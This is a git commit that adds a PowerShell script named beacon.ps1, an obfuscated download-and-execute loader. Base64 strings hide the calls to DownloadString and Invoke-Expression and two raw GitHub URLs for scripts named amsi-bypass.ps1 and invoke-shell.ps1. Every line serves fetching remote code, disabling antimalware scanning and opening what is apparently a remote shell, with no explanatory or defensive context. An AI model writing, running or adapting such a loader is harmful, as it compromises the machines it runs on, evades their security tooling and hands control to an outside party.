718c9ddf9cec5f5ad91dedc036832dd92fd4a248
eytestingct-jpg <eytestingct@gmail.com>
2025-09-19 04:01:48 +0530

    Create beacon.ps1

---
+++ beacon.ps1
@@ -0,0 +1,10 @@
+${env:ComSpec}[-7..-(${(Get-Random -Minimum 1 -Maximum 4)})] -join '' | % { $x7qP9z = $_ }
+${env:ProgramData}[-$((3,5,7) | Get-Random)..-1] -join '' | % { $kM2rV8 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9hbXNpLWJ5cGFzcy5wczE=')) }
+${env:Temp}[-(${(Get-Random -Minimum 2 -Maximum 6)})..-1] -join '' | % { $nT4jW1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9pbnZva2Utc2hlbGwucHMx')) }
+${x7qP9z} -eq 'powershell' | % { $pL8mQ3 = [System.Reflection.Assembly]::LoadWithPartialName(('System'+'.'+'Net')).GetType('System.Net.WebClient') }
+${pL8mQ3}::new() | % { $zR6vY9 = $_ }
+${zR6vY9}.([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc=') | % { [System.Text.Encoding]::UTF8.GetString($_) }).Invoke(${kM2rV8}) | % { $bN5hX2 = $_ }
+&([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24='))) ${bN5hX2}
+${pL8mQ3}::new() | % { $cJ9kT7 = $_ }
+${cJ9kT7}.([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc=') | % { [System.Text.Encoding]::UTF8.GetString($_) }).Invoke(${nT4jW1}) | % { $fW2pZ4 = $_ }
+&([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24='))) ${fW2pZ4}
